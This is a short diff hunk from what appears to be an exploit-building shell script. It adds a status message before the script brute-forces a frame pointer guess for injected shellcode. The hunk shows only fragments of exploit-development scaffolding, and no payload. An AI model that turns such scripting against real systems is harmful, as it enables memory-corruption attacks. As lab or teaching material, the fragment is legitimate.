@@ -251,6 +251,7 @@ echo "Shellcode length: ${#SHELLCODE}"
 # not run in gdb can vary by 2 bytes in either direction. So without
 # a better method for finding the exact frame address we need a little
 # brute force.
+echo "Finding best guess for the frame pointer"
 FRAME_PTR=$(./find_frame_ptr.py)
 FRAME_PTR2=$(./find_frame_ptr.py 16)
 FRAME_PTR3=$(./find_frame_ptr.py -16)
